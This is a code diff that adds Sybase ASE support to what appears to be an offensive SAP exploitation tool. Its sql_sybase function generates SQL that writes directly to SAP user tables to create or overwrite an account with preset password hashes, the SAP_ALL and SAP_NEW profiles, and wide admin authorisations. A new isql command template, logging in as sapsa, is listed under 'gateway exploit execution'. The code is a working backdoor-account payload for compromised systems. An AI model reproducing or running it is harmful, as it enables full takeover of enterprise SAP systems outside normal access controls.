@@ -270,6 +270,54 @@ def sql_oracle(sid: str, client: str, username: str, schema: str = "SAPSR3",
     return stmts
 
 
+def sql_sybase(sid: str, client: str, username: str,
+               schema: str = "SAPSR3") -> list:
+    """Sybase ASE for SAP — isql -X batch statements (issue #26).
+
+    Differences from the HANA / MaxDB generators:
+      * Table names are schema-qualified (``SAPSR3.USR02`` etc.).
+        The isql session logs in as ``sapsa`` — a Sybase-level admin
+        that is NOT the SAP schema owner — so unqualified names miss.
+      * BINARY / VARBINARY literals use Sybase's ``0x<hex>`` syntax
+        (no quotes, no ``x`` prefix), unlike MaxDB's ``x'…'`` or HANA's
+        plain ``'…'`` string.
+      * The generator returns bare SQL — the writer inserts the ``go``
+        batch terminator between statements when writing the isql
+        input file.
+    """
+    def q(table: str) -> str:
+        return f"{schema}.{table}"
+    return [
+        f"DELETE FROM {q('USRBF2')} WHERE MANDT='{client}' AND BNAME='{username}'",
+        f"DELETE FROM {q('USR04')}  WHERE MANDT='{client}' AND BNAME='{username}'",
+        f"DELETE FROM {q('UST04')}  WHERE MANDT='{client}' AND BNAME='{username}'",
+        f"DELETE FROM {q('USREFUS')} WHERE MANDT='{client}' AND BNAME='{username}'",
+        f"DELETE FROM {q('USR02')}  WHERE MANDT='{client}' AND BNAME='{username}'",
+        f"INSERT INTO {q('USR02')} (MANDT,BNAME,BCODE,USTYP,CODVN) "
+        f"VALUES ('{client}','{username}',0x{BCODE_HEX},'{USER_TYPE}','{CODVN}')",
+        f"UPDATE {q('USR02')} SET PASSCODE=0x{PASSCODE_HEX} "
+        f"WHERE BNAME='{username}' AND MANDT='{client}'",
+        f"INSERT INTO {q('USREFUS')} (MANDT,BNAME,REFUSER) "
+        f"VALUES ('{client}','{username}','DDIC')",
+        f"INSERT INTO {q('UST04')} (MANDT,BNAME,PROFILE) "
+        f"VALUES ('{client}','{username}','SAP_ALL')",
+        f"INSERT INTO {q('UST04')} (MANDT,BNAME,PROFILE) "
+        f"VALUES ('{client}','{username}','SAP_NEW')",
+        f"INSERT INTO {q('USR04')} (MANDT,BNAME,NRPRO,PROFS) "
+        f"VALUES ('{client}','{username}','14','C SAP_ALL')",
+        f"INSERT INTO {q('USRBF2')} (MANDT,BNAME,OBJCT,AUTH) VALUES ('{client}','{username}','S_ADMI_FCD','&_SAP_ALL')",
+        f"INSERT INTO {q('USRBF2')} (MANDT,BNAME,OBJCT,AUTH) VALUES ('{client}','{username}','S_DATASET','&_SAP_ALL')",
+        f"INSERT INTO {q('USRBF2')} (MANDT,BNAME,OBJCT,AUTH) VALUES ('{client}','{username}','S_DEVELOP','&_SAP_ALL')",
+        f"INSERT INTO {q('USRBF2')} (MANDT,BNAME,OBJCT,AUTH) VALUES ('{client}','{username}','S_RFC','&_SAP_ALL')",
+        f"INSERT INTO {q('USRBF2')} (MANDT,BNAME,OBJCT,AUTH) VALUES ('{client}','{username}','S_TABU_DIS','&_SAP_ALL')",
+        f"INSERT INTO {q('USRBF2')} (MANDT,BNAME,OBJCT,AUTH) VALUES ('{client}','{username}','S_TCODE','&_SAP_ALL')",
+        f"INSERT INTO {q('USRBF2')} (MANDT,BNAME,OBJCT,AUTH) VALUES ('{client}','{username}','S_USER_AUT','&_SAP_ALL')",
+        f"INSERT INTO {q('USRBF2')} (MANDT,BNAME,OBJCT,AUTH) VALUES ('{client}','{username}','S_USER_GRP','&_SAP_ALL')",
+        f"INSERT INTO {q('USRBF2')} (MANDT,BNAME,OBJCT,AUTH) VALUES ('{client}','{username}','S_USER_PRO','&_SAP_ALL')",
+        f"INSERT INTO {q('USRBF2')} (MANDT,BNAME,OBJCT,AUTH) VALUES ('{client}','{username}','S_XMI_PROD','&_SAP_ALL')",
+    ]
+
+
 def sql_db2(sid: str, client: str, username: str) -> list:
     """DB2 — db2 CLI statements."""
     return _cleanup_sql(client, username) + [
@@ -311,6 +359,9 @@ SQL_GENERATORS = {
     "ORACLE":   sql_oracle,
     "DB6":      sql_db2,            # DB2
     "DB2":      sql_db2,
+    "SYB":      sql_sybase,          # Sybase ASE (SAP-on-Sybase, issue #26)
+    "SYBASE":   sql_sybase,
+    "ASE":      sql_sybase,
 }
 
 # DB CLI command templates (for gateway exploit execution)
@@ -322,6 +373,10 @@ DB_CLI_COMMANDS = {
     "HDB":      'hdbsql -n {db_host} -i 00 -U DEFAULT -o output.txt -I {sql_file}',
     "ORA":      'sqlplus -S /NOLOG @{sql_file}',
     "DB6":      'db2 {sql_statement}',
+    # Sybase: /sybase/<SID>/OCS-*/bin/isql — locator wrapper on the target
+    # resolves the OCS version and sets $SYBASE.  See
+    # sap_db_sql_writers._sybase_write_and_exec.
+    "SYB":      'isql -Usapsa -P{db_password} -S{sid} -X -b -i {sql_file}',
 }
 
 
@@ -346,6 +401,8 @@ def normalize_db_type(db_type_raw: str) -> str:
         return "ORA"
     if "DB2" in dt or "DB6" in dt:
         return "DB6"
+    if "SYBASE" in dt or "SYB" in dt or "ASE" in dt.split():
+        return "SYB"
     return dt
 
 
